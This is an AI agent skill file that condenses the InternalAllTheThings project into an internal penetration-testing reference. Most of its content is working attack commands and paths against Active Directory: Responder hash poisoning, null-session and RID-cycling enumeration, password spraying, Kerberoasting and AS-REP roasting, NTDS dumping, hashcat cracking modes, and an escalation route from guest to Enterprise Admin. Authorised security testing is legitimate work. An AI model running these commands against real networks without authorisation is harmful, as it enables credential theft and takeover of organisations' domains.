---
name: InternalAllTheThings
description: Use when performing internal network penetration testing, Active Directory attacks, lateral movement, privilege escalation, credential attacks, Kerberos exploitation, ADCS/ESC attacks, NTLM relay, cloud pentesting (AWS/Azure), red team operations, or when looking up specific commands for tools like BloodHound, Mimikatz, Impacket, NetExec, Rubeus, Certipy, or bloodyAD.
---

# InternalAllTheThings - Internal Pentest Reference

Comprehensive reference for Active Directory, internal network, and red team operations based on the InternalAllTheThings project by swisskyrepo.

## Methodology

```
Reconnaissance → Enumeration → Vulnerability ID → Validation → Exploitation → Post-Exploitation → Report
```

### Attack Priority Order

1. **No-Creds**: Password spraying, LLMNR/NBT-NS poisoning, Responder, null sessions, PXE boot
2. **Low-Priv User**: BloodHound, Kerberoasting, ASREPRoasting, LAPS/GMSA read, GPP cpassword
3. **Foothold**: ACL abuse, delegation attacks, shadow credentials, ADCS ESC attacks
4. **DA/EA**: DCSync, NTDS dump, Golden/Silver tickets, forest trust attacks

## Reference Files

| File | Content |
|------|---------|
| `ad-enumeration.md` | BloodHound, PowerView, AD Module, RID cycling, user hunting |
| `ad-adcs.md` | ADCS enumeration, ESC1-15, Golden Certificates, Pass-The-Certificate |
| `ad-kerberos.md` | Roasting, delegation (unconstrained/constrained/RBCD), tickets, S4U, bronze bit |
| `ad-credentials.md` | PTH, OPTH, PTK, NTDS dump, password spraying, LAPS, GMSA, shadow creds, GPP |
| `ad-acl-relay.md` | ACL/ACE abuse, NTLM relay, Kerberos relay, coercion (PetitPotam/SpoolSample) |
| `ad-misc.md` | GPO abuse, groups (DNSAdmins/Backup Ops), trusts, RODC, ADFS, Linux AD, CVEs, deployments |
| `redteam.md` | Access, Windows/Linux privesc, evasion (AMSI/EDR), persistence, pivoting |
| `cloud.md` | AWS enumeration/attacks, Azure AD/services attacks |
| `cheatsheets.md` | Mimikatz, hash cracking, network discovery, shells, PowerShell |

## Quick Command Reference

### Initial Enumeration (No Creds)
```ps1
# Responder - capture hashes
sudo responder -I eth0 -wfrd -P -v

# Enumerate without creds
netexec smb 10.10.10.0/24 -u '' -p ''
netexec smb 10.10.10.0/24 -u 'guest' -p ''
ldapsearch -x -H ldap://DC_IP -b "DC=domain,DC=local" "(objectClass=*)"

# RID cycling (no creds)
netexec smb 10.10.10.10 -u guest -p '' --rid-brute 10000
lookupsid.py -no-pass 'guest@dc.domain.local' 20000
```

### With Credentials
```ps1
# Collect BloodHound data
bloodhound-python -d domain.local -u user -p pass -gc DC.domain.local -c all
SharpHound.exe -c all -d domain.local

# Password spray
netexec smb 10.10.10.10 -u users.txt -p 'Password123' --continue-on-success
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Password123'

# Kerberoasting
GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.10 -request
netexec ldap 10.10.10.10 -u user -p pass --kerberoast output.txt

# ASREPRoasting
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile hashes.asrep
netexec ldap 10.10.10.10 -u user -p pass --asreproast output.txt

# NTDS dump (DA required)
netexec smb 10.10.10.10 -u admin -p pass --ntds
secretsdump.py domain/admin:pass@10.10.10.10
```

### Hash Cracking Quick Reference

| Hash Type | Hashcat Mode |
|-----------|-------------|
| NTLM | `1000` |
| NTLMv1 | `5500` |
| NTLMv2 | `5600` |
| Kerberos TGS (RC4) | `13100` |
| Kerberos TGS (AES128) | `19600` |
| Kerberos TGS (AES256) | `19700` |
| Kerberos AS-REP | `18200` |
| NTP (Timeroasting) | `31300` |

```ps1
hashcat -m 13100 -a 0 hashes.txt rockyou.txt
hashcat -m 5600 -a 0 ntlmv2.txt rockyou.txt -r rules/best64.rule
```

## Key Tools

| Tool | Purpose |
|------|---------|
| `netexec` / `nxc` | Swiss army knife for network services |
| `impacket` suite | Kerberos, SMB, LDAP attacks |
| `bloodyAD` | AD attribute manipulation |
| `certipy` | ADCS enumeration and exploitation |
| `Rubeus.exe` | Kerberos ticket operations |
| `mimikatz` | Credential extraction |
| `BloodHound` | AD attack path analysis |
| `responder` | Poison LLMNR/MDNS/NBT-NS |
| `SharpHound` | BloodHound data collector |
| `PowerView` | AD enumeration (PowerShell) |

## Common Attack Paths

```
Guest/Null → RID cycling → spray → foothold
Foothold → BloodHound → ACL abuse / ADCS ESC / Delegation → DA
DA → DCSync → NTDS → crack/PTH → lateral movement
Child DA → SID history → Enterprise Admin (cross-forest)
```
